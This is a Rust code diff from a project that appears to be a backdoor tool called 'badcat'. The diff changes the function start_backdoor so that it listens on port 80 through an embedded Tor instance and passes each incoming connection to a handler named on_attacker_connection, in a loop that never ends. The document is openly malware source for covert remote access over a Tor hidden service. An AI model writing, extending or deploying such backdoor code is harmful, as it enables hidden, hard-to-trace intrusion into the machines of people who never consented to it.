@@ -7,16 +7,19 @@ mod setting;
 
 use std::error::Error;
 use std::io::{Read, Write};
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 use std::process::{Command, Stdio};
 use std::{env, fs, io};
 
 use setting::Setting;
 
 use badcat_lib::io as badcat_io;
-use tor::{stream::Connection, Tor};
+use tor::{
+    stream::{Connection, Server},
+    Tor,
+};
 
-fn main() -> Result<(), Box<dyn Error>> {
+pub fn main() -> Result<(), Box<dyn Error>> {
     let setting = Setting::new()?;
 
     let argument = env::args().nth(1).unwrap_or("".to_owned());
@@ -53,10 +56,12 @@ fn start_backdoor(setting: Setting) -> Result<(), Box<dyn Error>> {
 
     // start the embeded Tor instance
     let tor = Tor::new(&config);
+    let server = Server::listen(80)?;
 
-    tor::stream::listen_connections(80, on_attacker_connection)?;
-
-    tor.stop()
+    loop {
+        let mut conn = server.incoming();
+        on_attacker_connection(&mut conn);
+    }
 }
 
 /// Write a new torrc to `path`. It always reads the template torrc from `setting`.
